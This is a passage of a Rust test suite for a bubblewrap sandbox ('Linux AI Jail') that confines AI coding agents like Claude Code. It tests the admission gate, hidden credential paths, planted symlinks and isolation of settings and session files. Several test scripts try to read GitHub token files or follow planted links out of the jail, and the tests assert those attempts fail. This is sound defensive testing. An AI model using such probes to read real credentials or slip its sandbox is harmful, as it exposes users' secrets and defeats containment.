        .expect("run Linux AI Jail with --identity");
    let stderr = stderr_to_end(&mut child);
    let status = child.wait().unwrap();
    let stderr = stderr
        .recv_timeout(std::time::Duration::from_secs(30))
        .expect("every process of the jail ended");
    assert_eq!(status.code(), Some(2), "{stderr}");
    assert!(
        stderr.contains(
            "innerwarden contain: Active Defence on this host did not admit this jail, and its \
             profile starts it only when admitted."
        ),
        "{stderr}"
    );
    assert!(
        stderr.contains(&format!(
            "innerwarden contain: Check that Active Defence is running (systemctl status \
             innerwarden-agent), then try again. The jail waits for it because of start = \
             \"only_when_admitted\" in {}.",
            home.path()
                .join(".config/innerwarden/agent-profiles.toml")
                .display()
        )),
        "{stderr}"
    );
    assert!(
        !stderr.contains("holds no record that the host admitted it"),
        "the jail's first process was ended before it read its record: {stderr}"
    );
    std::thread::sleep(std::time::Duration::from_millis(500));
    assert!(!marker.exists(), "the command ran: {stderr}");
    assert!(
        processes_naming(&marker).is_empty(),
        "a process of the jail is left: {:?}",
        processes_naming(&marker)
    );
    let dir = home.path().join(".local/state/innerwarden/instances");
    let records: Vec<_> = std::fs::read_dir(&dir)
        .map(|entries| entries.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    assert!(
        records.is_empty(),
        "no record of an instance that never ran: {records:?}"
    );
}

/// SEC-4: a launcher that dies while it waits for the host's answer (killed,
/// a Ctrl-C, the OOM killer) leaves its jail an empty record, and the jail
/// does not start its command: the gate refuses it.
///
/// The host here is a listener that takes the request and never answers;
/// the launcher is SIGKILLed the moment the request arrives, after bwrap
/// reported the jail's first process and before the launcher decided.
///
/// FAILS ON REVERT: hand the jail its command without the gate (drop
/// `gate_instance` in `build_linux_jail`, as before this fix) and the
/// command runs once the launcher is gone.
#[cfg(target_os = "linux")]
#[test]
fn a_launcher_that_dies_before_the_host_answers_starts_nothing() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = home_that_starts_only_once_admitted();
    let project = tempfile::TempDir::new().unwrap();
    let marker = project.path().join("COMMAND-RAN");
    let script = format!("touch '{}'", marker.display());
    // Active Defence is "installed" (its ctl is found), and its agent is a
    // listener that takes the request and answers nothing.
    let ad = tempfile::TempDir::new().unwrap();
    let ctl = ad.path().join("innerwarden-ctl");
    std::fs::write(&ctl, "#!/bin/sh\nexit 0\n").unwrap();
    std::fs::set_permissions(&ctl, std::fs::Permissions::from_mode(0o755)).unwrap();
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    listener.set_nonblocking(true).unwrap();
    let url = format!("http://{}", listener.local_addr().unwrap());

    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::piped());
    let mut child = identified_without_a_scope(&mut command)
        .env("IW_AD_CLI_DIRS", ad.path())
        .env("INNERWARDEN_AGENT_URL", &url)
        .spawn()
        .expect("run Linux AI Jail with --identity");
    let stderr = stderr_to_end(&mut child);
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    let held = loop {
        match listener.accept() {
            Ok((stream, _)) => break stream,
            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                if std::time::Instant::now() > deadline || child.try_wait().unwrap().is_some() {
                    let _ = child.kill();
                    panic!(
                        "the launcher never asked the host: {}",
                        stderr
                            .recv_timeout(std::time::Duration::from_secs(5))
                            .unwrap_or_default()
                    );
                }
                std::thread::sleep(std::time::Duration::from_millis(20));
            }
            Err(e) => panic!("accept: {e}"),
        }
    };
    child.kill().expect("SIGKILL the launcher");
    child.wait().unwrap();
    let stderr = stderr
        .recv_timeout(std::time::Duration::from_secs(30))
        .expect("every process of the jail ended");
    drop(held);
    std::thread::sleep(std::time::Duration::from_millis(500));
    assert!(
        !marker.exists(),
        "the command ran without an admission: {stderr}"
    );
    assert!(
        stderr.contains("innerwarden contain: this jail holds no record that the host admitted it"),
        "the gate refused it: {stderr}"
    );
    assert!(
        processes_naming(&marker).is_empty(),
        "a process of the jail is left: {:?}",
        processes_naming(&marker)
    );
}

/// A home whose own profile hides `paths` in the claude-code jail.
#[cfg(target_os = "linux")]
fn home_that_hides(paths: &[&str]) -> tempfile::TempDir {
    use std::os::unix::fs::PermissionsExt;
    let home = state_home();
    let dir = home.path().join(".config/innerwarden");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("agent-profiles.toml");
    let list = paths
        .iter()
        .map(|path| format!("\"{path}\""))
        .collect::<Vec<_>>()
        .join(", ");
    std::fs::write(
        &file,
        format!("schema_version = 2\n[profile.claude-code.jail]\nhide_home = [{list}]\n"),
    )
    .unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    home
}

/// brk-1: a hidden home path that is a link (a dotfiles manager's
/// `~/.config/gh -> ../dotfiles/gh`) does not stop the jail: bwrap is never
/// asked to mount on a link, and the token stays out of reach. A link to a
/// folder the jail shows (`~/.config/gh3 -> ~/.local/share/gh3`) is covered
/// where it leads.
///
/// FAILS ON REVERT: mount the path as named (`plan_hidden_home` before this
/// fix) and bwrap aborts: "Can't mount tmpfs on .../.config/gh".
#[cfg(target_os = "linux")]
#[test]
fn a_hidden_home_path_behind_a_link_hides_what_it_leads_to() {
    require_bwrap();
    let home = home_that_hides(&[".config/gh", ".config/gh3"]);
    let h = home.path();
    std::fs::create_dir_all(h.join("dotfiles/gh")).unwrap();
    std::fs::write(h.join("dotfiles/gh/hosts.yml"), "TOKEN-GH").unwrap();
    std::os::unix::fs::symlink("../dotfiles/gh", h.join(".config/gh")).unwrap();
    std::fs::create_dir_all(h.join(".local/share/gh3")).unwrap();
    std::fs::write(h.join(".local/share/gh3/hosts.yml"), "TOKEN-GH3").unwrap();
    std::os::unix::fs::symlink(h.join(".local/share/gh3"), h.join(".config/gh3")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let script = format!(
        "cat '{0}/.config/gh/hosts.yml' '{0}/.config/gh3/hosts.yml' \
         '{0}/.local/share/gh3/hosts.yml' 2>/dev/null; echo DONE",
        h.display()
    );
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", h);
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "the jail did not start: {stderr}");
    assert!(stdout.contains("DONE"), "{stdout} {stderr}");
    assert!(
        !stdout.contains("TOKEN"),
        "a hidden token was read: {stdout}"
    );
}

/// F3: a hidden home path that is not there when the jail starts
/// (`.cache/git/credential` on an account that never used git's credential
/// cache) is made, empty and 0700, before the jail starts, and covered; what
/// a host program makes there while the jail runs stays out of it.
///
/// FAILS ON REVERT: skip `make_hidden_folder` and the file the host makes
/// during the run is listed inside the jail.
#[cfg(target_os = "linux")]
#[test]
fn a_hidden_home_path_made_after_the_jail_started_stays_hidden() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = home_that_hides(&[".cache/git/credential"]);
    let h = home.path();
    std::fs::create_dir_all(h.join(".cache")).unwrap();
    let credential = h.join(".cache/git/credential");
    assert!(!credential.exists());
    let project = tempfile::TempDir::new().unwrap();
    let ready = project.path().join("READY");
    let script = format!(
        "touch '{}'; i=0; while [ $i -lt 50 ] && [ ! -e '{}/GO' ]; do sleep 0.1; i=$((i+1)); done; \
         ls -A '{}'; echo DONE",
        ready.display(),
        project.path().display(),
        credential.display()
    );
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", h)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    let child = identified_without_a_scope(&mut command)
        .spawn()
        .expect("run Linux AI Jail with --identity");
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    while !ready.exists() && std::time::Instant::now() < deadline {
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    // The host's git makes its socket in the folder while the jail runs.
    std::fs::create_dir_all(&credential).unwrap();
    std::fs::write(credential.join("socket"), "").unwrap();
    std::fs::write(project.path().join("GO"), "").unwrap();
    let output = child.wait_with_output().unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{stderr}");
    assert!(stdout.contains("DONE"), "{stdout} {stderr}");
    assert!(
        !stdout.contains("socket"),
        "the host's socket is in the jail: {stdout}"
    );
    let mode = std::fs::metadata(&credential).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o700, "made as git wants it");
}

/// A person's own home folder that the jail writes is a link to a folder
/// outside the home (`~/.cache` on another disk): a hidden path below it is
/// made (empty, 0700) and hidden where the folder leads, as the jail binds
/// it, and the jail starts. Measured before this: the launch stopped with
/// "outside the home", having first made the folders through the link.
///
/// FAILS ON REVERT: take only the home for the jail's home in
/// `plan_hidden_home` and the launch stops "outside the home".
#[cfg(target_os = "linux")]
#[test]
fn a_home_folder_linked_outside_the_home_hides_where_it_leads() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = home_that_hides(&[".cache/git/credential", ".cache/gh"]);
    let h = home.path();
    let elsewhere = tempfile::TempDir::new().unwrap();
    let cache = elsewhere.path().join("cache");
    std::fs::create_dir_all(cache.join("gh")).unwrap();
    std::fs::write(cache.join("gh/hosts.yml"), "TOKEN-GH").unwrap();
    std::os::unix::fs::symlink(&cache, h.join(".cache")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let script = format!(
        "cat '{0}/.cache/gh/hosts.yml' 2>/dev/null; ls -A '{0}/.cache/git/credential'; echo DONE",
        h.display()
    );
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", h);
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "the jail did not start: {stderr}");
    assert!(stdout.contains("DONE"), "{stdout} {stderr}");
    assert!(
        !stdout.contains("TOKEN"),
        "a hidden token was read: {stdout}"
    );
    let made = cache.join("git/credential");
    let mode = std::fs::metadata(&made).unwrap().permissions().mode() & 0o777;
    assert_eq!(mode, 0o700, "made where the folder leads, as git wants it");
    assert!(
        std::fs::symlink_metadata(h.join(".cache"))
            .unwrap()
            .file_type()
            .is_symlink(),
        "the person's link is left as it was"
    );
}

/// F2: a link planted where a hidden home path will be (the agent can write
/// `~/.cache`) never moves the mask: one that leads to the project, or
/// outside the home, stops the launch before anything runs.
///
/// FAILS ON REVERT (measured): drop the home check in `plan_hidden_home`
/// and the launch goes on with the link to `/etc/apt`; drop the check of
/// what the jail needs in `validate_jail_inputs` and the jail starts with
/// its project under an empty mount.
#[cfg(target_os = "linux")]
#[test]
fn a_planted_link_never_moves_a_hidden_home_path() {
    require_bwrap();
    for target in ["project", "/etc/apt"] {
        let home = home_that_hides(&[".cache/git/credential"]);
        let h = home.path();
        let project = tempfile::TempDir::new_in(h).unwrap();
        std::fs::write(project.path().join("main.rs"), "fn main() {}").unwrap();
        std::fs::create_dir_all(h.join(".cache/git")).unwrap();
        let to = if target == "project" {
            project.path().to_path_buf()
        } else {
            std::path::PathBuf::from(target)
        };
        std::os::unix::fs::symlink(&to, h.join(".cache/git/credential")).unwrap();
        let marker = project.path().join("COMMAND-RAN");
        let script = format!("touch '{}'", marker.display());
        let mut command = cli();
        command
            .args([
                "contain",
                "--identity",
                "--project",
                project.path().to_str().unwrap(),
                "--",
                "/bin/sh",
                "-c",
                &script,
            ])
            .env("HOME", h);
        let output = identified_without_a_scope(&mut command)
            .output()
            .expect("run Linux AI Jail with --identity");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert_eq!(output.status.code(), Some(2), "{target}: {stderr}");
        assert!(
            stderr.contains("holds the project") || stderr.contains("outside the home"),
            "{target}: {stderr}"
        );
        assert!(!marker.exists(), "{target}: the command ran");
    }
}

/// One identified jail on `home`, working in `project`, running `script`
/// under `/bin/sh`: its output.
#[cfg(target_os = "linux")]
fn identified_sh(
    home: &std::path::Path,
    project: &std::path::Path,
    script: &str,
) -> std::process::Command {
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            script,
        ])
        .env("HOME", home);
    identified_without_a_scope(&mut command);
    command
}

/// What Claude Code does when it saves its settings file, `~/.claude.json`
/// (measured with Claude Code 2.1.304): it reads where a link there leads,
/// writes a new file beside that place (`<target>.tmp.<pid>.<hex>`, made
/// with `O_EXCL`) and renames it onto the place, and it keeps a copy of the
/// file in `~/.claude/backups` (`.claude.json.backup.<ms>`, a name that
/// starts with a dot, so `grep -r`, never a `*` glob, reads it). It reads the
/// file first, as Claude Code loads it before it saves. Exits 71 where
/// `~/.claude.json` is no link, 72 where the write or the rename fails, 73
/// where the jail reads the person's own settings file (before the save
/// replaces it) or a copy of it, 77 where it cannot write its own copy.
#[cfg(target_os = "linux")]
const SAVE_AS_CLAUDE_CODE_DOES: &str = r#"target=$(readlink "$HOME/.claude.json") || exit 71
if grep -qs HOST-OWN "$HOME/.claude.json"; then exit 73; fi
if grep -rqs HOST-OWN "$HOME/.claude/backups"; then exit 73; fi
tmp="$target.tmp.$$.0a1b2c3d4e5f"
set -C; printf '{"kept":"JAIL-STATE"}\n' > "$tmp" || exit 72; set +C
mv "$tmp" "$target" || exit 72
mkdir -p "$HOME/.claude/backups" || exit 77
printf JAIL-COPY > "$HOME/.claude/backups/.claude.json.backup.1" || exit 77
echo SAVED
"#;

/// M30: Claude Code keeps its settings file in the home, and an identified
/// jail's home is an empty folder of its own, so the file was gone at every
/// launch (and Claude Code warned twice, from the second launch on, that it
/// was missing). It is a link to the same name in the shared `~/.claude`
/// now: a save as Claude Code makes it lands on the host, the next jail
/// reads it, and the person's own `~/.claude.json` is never shown in the
/// jail nor changed. Nor is the copy of it the host's Claude Code keeps in
/// `~/.claude/backups` (M30CW-1), and the jail's own copy stays in the
/// jail. Nothing new is made in the home itself.
///
/// FAILS ON REVERT: drop the link, and the save finds no link (71) and the
/// second jail no file; drop the jail's own backups folder, and the jail
/// reads the host's copy of the person's file (73).
#[cfg(target_os = "linux")]
#[test]
fn claude_codes_settings_file_survives_between_identified_jails() {
    require_bwrap();
    let home = state_home();
    let h = home.path();
    std::fs::create_dir_all(h.join(".claude/backups")).unwrap();
    std::fs::write(h.join(".claude.json"), "{\"own\":\"HOST-OWN-STATE\"}\n").unwrap();
    // The copy the host's Claude Code keeps of the person's own file.
    let host_copy = h.join(".claude/backups/.claude.json.backup.1792459465480");
    std::fs::write(&host_copy, "{\"own\":\"HOST-OWN-STATE\"}\n").unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let names = |dir: &std::path::Path| {
        let mut names: Vec<_> = std::fs::read_dir(dir)
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        names.sort();
        names
    };
    let before = names(h);

    let first = identified_sh(h, project.path(), SAVE_AS_CLAUDE_CODE_DOES)
        .output()
        .expect("run the first jail");
    let (out, err) = (
        String::from_utf8_lossy(&first.stdout),
        String::from_utf8_lossy(&first.stderr),
    );
    assert!(first.status.success(), "{:?}: {out} {err}", first.status);
    assert!(out.contains("SAVED"), "{out} {err}");

    let second = identified_sh(
        h,
        project.path(),
        "cat \"$HOME/.claude.json\"; ls -a \"$HOME/.claude\"",
    )
    .output()
    .expect("run the second jail");
    let out = String::from_utf8_lossy(&second.stdout);
    assert!(second.status.success(), "{out}");
    assert!(out.contains("JAIL-STATE"), "the next jail lost it: {out}");
    assert!(!out.contains(".tmp."), "a temporary file was left: {out}");

    let kept = std::fs::read_to_string(h.join(".claude/.claude.json")).unwrap();
    assert!(kept.contains("JAIL-STATE"), "{kept}");
    let own = std::fs::read_to_string(h.join(".claude.json")).unwrap();
    assert_eq!(
        own, "{\"own\":\"HOST-OWN-STATE\"}\n",
        "the person's own file"
    );
    assert_eq!(names(h), before, "nothing new in the home itself");
    // The sessions folder the jail covers, made by the launcher as Claude
    // Code makes it, and left empty on the host.
    use std::os::unix::fs::PermissionsExt;
    let sessions = std::fs::symlink_metadata(h.join(".claude/sessions")).unwrap();
    assert!(sessions.is_dir());
    assert_eq!(sessions.permissions().mode() & 0o777, 0o700);
    assert_eq!(
        std::fs::read_dir(h.join(".claude/sessions"))
            .unwrap()
            .count(),
        0
    );
    // The host's copy is as it was, and the jail's own copy never reached
    // the host.
    assert_eq!(
        names(&h.join(".claude/backups")),
        [std::ffi::OsString::from(
            ".claude.json.backup.1792459465480"
        )]
    );
    assert_eq!(
        std::fs::read_to_string(&host_copy).unwrap(),
        "{\"own\":\"HOST-OWN-STATE\"}\n"
    );
}

/// M30: Claude Code is process 2 in every jail and lists each running
/// session as `~/.claude/sessions/<pid>.json`, in the `~/.claude` the jails
/// share, so two jails at once wrote the same `2.json` and each read the
/// other's. Each identified jail has an empty list of its own now: two at
/// once keep their own `2.json`, neither sees the host's sessions, and
/// nothing a jail writes there reaches the host.
///
/// FAILS ON REVERT: drop the jail's own sessions folder, and the jail that
/// wrote first reads the other's `2.json`, and the host keeps it.
#[cfg(target_os = "linux")]
#[test]
fn two_identified_jails_at_once_keep_separate_session_files() {
    require_bwrap();
    let home = state_home();
    let h = home.path();
    std::fs::create_dir_all(h.join(".claude/sessions")).unwrap();
    std::fs::write(
        h.join(".claude/sessions/999.json"),
        "{\"pid\":999,\"sessionId\":\"HOST-OWN-SESSION\"}",
    )
    .unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let p = project.path();
    // A writes first, then B, then each reads: both are running when each
    // writes, and each read comes after both writes.
    let script = |me: &str, other: &str| {
        let wait = format!(
            "i=0; while [ ! -e '{p}/ready-{other}' ] && [ $i -lt 300 ]; do sleep 0.1; i=$((i+1)); done\n\
             [ -e '{p}/ready-{other}' ] || exit 76\n",
            p = p.display()
        );
        let write = format!(
            "printf '{{\"pid\":2,\"jail\":\"{me}\"}}' > \"$HOME/.claude/sessions/2.json\" || exit 75\n\
             touch '{p}/ready-{me}'\n",
            p = p.display()
        );
        let (first, then) = if me == "A" {
            (write, wait)
        } else {
            (wait, write)
        };
        format!(
            "[ \"$$\" = 2 ] || {{ echo \"PID-$$\"; exit 74; }}\n{first}{then}\
             cat \"$HOME/.claude/sessions/2.json\"; echo; ls \"$HOME/.claude/sessions\""
        )
    };
    let a = identified_sh(h, p, &script("A", "B"))
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("start jail A");
    let b = identified_sh(h, p, &script("B", "A"))
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("start jail B");
    for (me, other, child) in [("A", "B", a), ("B", "A", b)] {
        let output = child.wait_with_output().expect("jail ended");
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(
            output.status.success(),
            "{me}: {:?} {out} {err}",
            output.status
        );
        assert!(
            out.contains(&format!("\"jail\":\"{me}\"")),
            "{me} lost its own 2.json: {out}"
        );
        assert!(
            !out.contains(&format!("\"jail\":\"{other}\"")),
            "{me} read {other}'s: {out}"
        );
        assert!(!out.contains("999.json"), "{me} saw the host's: {out}");
    }
    let left: Vec<_> = std::fs::read_dir(h.join(".claude/sessions"))
        .unwrap()
        .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
        .collect();
    assert_eq!(left, ["999.json"], "only the host's own session is there");
}

/// Where `~/.claude/.claude.json` is a link of the person's (a dotfiles
/// manager's), or anything but a file, the jail makes no link to it: a save
/// through two links would replace the person's link with a file. The jail
/// keeps Claude Code's file in its own home then, as before, and the
/// person's link is left as it was.
///
/// FAILS ON REVERT: let the launcher take a link there as a kept file, and
/// the save replaces the person's link.
#[cfg(target_os = "linux")]
#[test]
fn a_link_in_place_of_the_kept_settings_file_is_left_alone() {
    require_bwrap();
    let home = state_home();
    let h = home.path();
    std::fs::create_dir_all(h.join("dotfiles")).unwrap();
    std::fs::create_dir_all(h.join(".claude")).unwrap();
    std::fs::write(h.join("dotfiles/claude.json"), "{}").unwrap();
    std::os::unix::fs::symlink("../dotfiles/claude.json", h.join(".claude/.claude.json")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let output = identified_sh(
        h,
        project.path(),
        &format!("[ -L \"$HOME/.claude.json\" ] && echo LINKED; {SAVE_AS_CLAUDE_CODE_DOES}"),
    )
    .output()
    .expect("run the jail");
    let out = String::from_utf8_lossy(&output.stdout);
    assert_eq!(
        output.status.code(),
        Some(71),
        "no link to save through: {out}"
    );
    assert!(!out.contains("LINKED"), "{out}");
    let link = std::fs::symlink_metadata(h.join(".claude/.claude.json")).unwrap();
    assert!(
        link.file_type().is_symlink(),
        "the person's link was replaced"
    );
    assert_eq!(
        std::fs::read_to_string(h.join("dotfiles/claude.json")).unwrap(),
        "{}"
    );
}

/// A kept settings file a hidden home path covers stays hidden, and the
/// jail makes no link to it: Claude Code keeps its file in the jail's own
/// home then, as before. Where the hidden path is not there yet, the
/// launcher makes it an empty folder, and no link is made to that either.
///
/// FAILS ON REVERT: make the link whatever covers the kept file, and the
/// jail's `~/.claude.json` leads to the hidden place.
#[cfg(target_os = "linux")]
#[test]
fn a_kept_settings_file_a_profile_hides_stays_hidden() {
    require_bwrap();
    for there in [true, false] {
        let home = home_that_hides(&[".claude/.claude.json"]);
        let h = home.path();
        std::fs::create_dir_all(h.join(".claude")).unwrap();
        if there {
            std::fs::write(h.join(".claude/.claude.json"), "HIDDEN-KEPT").unwrap();
        }
        let project = tempfile::TempDir::new().unwrap();
        let output = identified_sh(
            h,
            project.path(),
            "[ -L \"$HOME/.claude.json\" ] && echo LINKED; \
             cat \"$HOME/.claude.json\" \"$HOME/.claude/.claude.json\" 2>/dev/null; echo DONE",
        )
        .output()
        .expect("run the jail");
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert!(output.status.success(), "{there}: {out} {err}");
        assert!(out.contains("DONE"), "{there}: {out} {err}");
        assert!(!out.contains("LINKED"), "{there}: a link to it: {out}");
        assert!(!out.contains("HIDDEN-KEPT"), "{there}: it was read: {out}");
    }
}

/// M30CW-SEC-2: the person's own `~/.claude.json` is a link to
/// `.claude/.claude.json` (settings kept with dotfiles), or a hard link to
/// it: the jail makes no link to that file, so its Claude Code never loads
/// or rewrites the person's own settings, and the file is as it was.
///
/// FAILS ON REVERT: drop the launcher's check of the person's own file, and
/// the jail saves through the link onto it.
#[cfg(target_os = "linux")]
#[test]
fn the_persons_own_settings_file_in_claudes_folder_is_never_the_jails() {
    require_bwrap();
    for hard in [false, true] {
        let home = state_home();
        let h = home.path();
        std::fs::create_dir_all(h.join(".claude")).unwrap();
        let kept = h.join(".claude/.claude.json");
        std::fs::write(&kept, "{\"own\":\"HOST-OWN-STATE\"}\n").unwrap();
        if hard {
            std::fs::hard_link(&kept, h.join(".claude.json")).unwrap();
        } else {
            std::os::unix::fs::symlink(".claude/.claude.json", h.join(".claude.json")).unwrap();
        }
        let project = tempfile::TempDir::new().unwrap();
        let output = identified_sh(
            h,
            project.path(),
            &format!("[ -L \"$HOME/.claude.json\" ] && echo LINKED; {SAVE_AS_CLAUDE_CODE_DOES}"),
        )
        .output()
        .expect("run the jail");
        let out = String::from_utf8_lossy(&output.stdout);
        let err = String::from_utf8_lossy(&output.stderr);
        assert_eq!(output.status.code(), Some(71), "hard={hard}: {out} {err}");
        assert!(!out.contains("LINKED"), "hard={hard}: {out}");
        assert_eq!(
            std::fs::read_to_string(&kept).unwrap(),
            "{\"own\":\"HOST-OWN-STATE\"}\n",
            "hard={hard}: the person's own file"
        );
    }
}

/// M30CW-SEC-4: `~/.claude` is a link to `~/.config/claude`, so the jail
/// shows the folder twice, through the `.claude` bind and through the
/// `.config` bind. The jail's own sessions and backups folders cover both:
/// neither place lists the host's sessions or the copy of the person's
/// file, and what the jail writes at the second place never reaches the
/// host.
///
/// FAILS ON REVERT: cover only the place the most specific bind shows, and
/// the jail lists the host's `999.json` through `~/.config/claude`.
#[cfg(target_os = "linux")]
#[test]
fn claude_codes_folders_are_the_jails_own_through_a_linked_claude_folder() {
    require_bwrap();
    let home = state_home();
    let h = home.path();
    let real = h.join(".config/claude");
    std::fs::create_dir_all(real.join("sessions")).unwrap();
    std::fs::create_dir_all(real.join("backups")).unwrap();
    std::fs::write(real.join("sessions/999.json"), "HOST-OWN-SESSION").unwrap();
    std::fs::write(real.join("backups/.claude.json.backup.1"), "HOST-OWN-STATE").unwrap();
    std::os::unix::fs::symlink(".config/claude", h.join(".claude")).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let script = "for d in .claude/sessions .config/claude/sessions .claude/backups \
                  .config/claude/backups; do echo \"== $d\"; ls -A \"$HOME/$d\" || exit 75; done; \
                  grep -rs HOST-OWN \"$HOME/.claude/\" \"$HOME/.config/claude/\"; \
                  printf x > \"$HOME/.config/claude/sessions/7.json\" || exit 76; echo DONE";
    let output = identified_sh(h, project.path(), script)
        .output()
        .expect("run the jail");
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{:?}: {out} {err}", output.status);
    assert!(out.contains("DONE"), "{out} {err}");
    assert!(!out.contains("999.json"), "the host's sessions: {out}");
    assert!(!out.contains("backup.1"), "the host's copy: {out}");
    assert!(!out.contains("HOST-OWN"), "{out}");
    assert!(!real.join("sessions/7.json").exists(), "reached the host");
    assert!(!err.contains("is the host's in this jail"), "{err}");
}

/// M30CW-BRK-1: a profile that shows the person's own `~/.claude.json`
/// read-only (`extra_ro`, to give the jailed agent the person's MCP
/// servers) still starts its identified jail, and the jail shows that file
/// as the profile says. Measured with bwrap 0.9.0 before this: the link the
/// jail made there came first, and bwrap aborted every launch with "Can't
/// create file at .../.claude.json".
///
/// FAILS ON REVERT: check only the hidden and denied paths before the link,
/// and the jail never starts.
#[cfg(target_os = "linux")]
#[test]
fn a_profile_that_shows_the_persons_settings_file_read_only_still_starts() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = state_home();
    let h = home.path();
    std::fs::create_dir_all(h.join(".claude")).unwrap();
    std::fs::write(h.join(".claude.json"), "{\"own\":\"HOST-OWN-STATE\"}\n").unwrap();
    let dir = h.join(".config/innerwarden");
    std::fs::create_dir_all(&dir).unwrap();
    let file = dir.join("agent-profiles.toml");
    std::fs::write(
        &file,
        "schema_version = 2\n[profile.claude-code.jail]\nextra_ro = [\"~/.claude.json\"]\n",
    )
    .unwrap();
    std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o600)).unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let output = identified_sh(
        h,
        project.path(),
        "[ -L \"$HOME/.claude.json\" ] && echo LINKED; cat \"$HOME/.claude.json\"; \
         if ( : > \"$HOME/.claude.json\" ) 2>/dev/null; then echo WRITTEN; fi; echo DONE",
    )
    .output()
    .expect("run the jail");
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "the jail did not start: {err}");
    assert!(out.contains("DONE"), "{out} {err}");
    assert!(out.contains("HOST-OWN-STATE"), "the profile's view: {out}");
    assert!(!out.contains("LINKED") && !out.contains("WRITTEN"), "{out}");
    assert_eq!(
        std::fs::read_to_string(h.join(".claude.json")).unwrap(),
        "{\"own\":\"HOST-OWN-STATE\"}\n"
    );
}

/// M30CW-BRK-2: `--project ~/.claude` (to have the agent edit its own
/// CLAUDE.md) shows the folder once more, after the jail's own sessions
/// folder used to be laid. The jail's own folders come after the project
/// now: it does not list the host's sessions, and its `2.json` stays in it.
///
/// FAILS ON REVERT: lay the jail's own folders before the project, and the
/// project brings the host's back.
#[cfg(target_os = "linux")]
#[test]
fn a_project_that_is_claudes_folder_keeps_the_jails_own_sessions() {
    require_bwrap();
    let home = state_home();
    let h = home.path();
    std::fs::create_dir_all(h.join(".claude/sessions")).unwrap();
    std::fs::write(h.join(".claude/sessions/999.json"), "HOST-OWN-SESSION").unwrap();
    std::fs::write(h.join(".claude/CLAUDE.md"), "PROJECT-OK").unwrap();
    let output = identified_sh(
        h,
        &h.join(".claude"),
        "cat CLAUDE.md; echo; ls -A \"$HOME/.claude/sessions\"; \
         printf x > \"$HOME/.claude/sessions/2.json\" || exit 75; echo DONE",
    )
    .output()
    .expect("run the jail");
    let out = String::from_utf8_lossy(&output.stdout);
    let err = String::from_utf8_lossy(&output.stderr);
    assert!(output.status.success(), "{:?}: {out} {err}", output.status);
    assert!(
        out.contains("PROJECT-OK") && out.contains("DONE"),
        "{out} {err}"
    );
    assert!(!out.contains("999.json"), "the host's sessions: {out}");
    assert!(
        !h.join(".claude/sessions/2.json").exists(),
        "reached the host"
    );
}

/// M30CW-BRK-2: where a folder of Claude Code's runs cannot be the jail's
/// own (`~/.claude/sessions` is a link of the person's), the launcher says
/// the jail shows the host's, once, and leaves the link as it was; the jail
/// starts. A jail whose folders are its own says nothing of it.
///
/// FAILS ON REVERT: drop the sentence, and the jail shares the host's
/// session list with no word.
#[cfg(target_os = "linux")]
#[test]
fn a_folder_the_jail_cannot_have_of_its_own_is_said_to_be_the_hosts() {
    require_bwrap();
    let home = state_home();
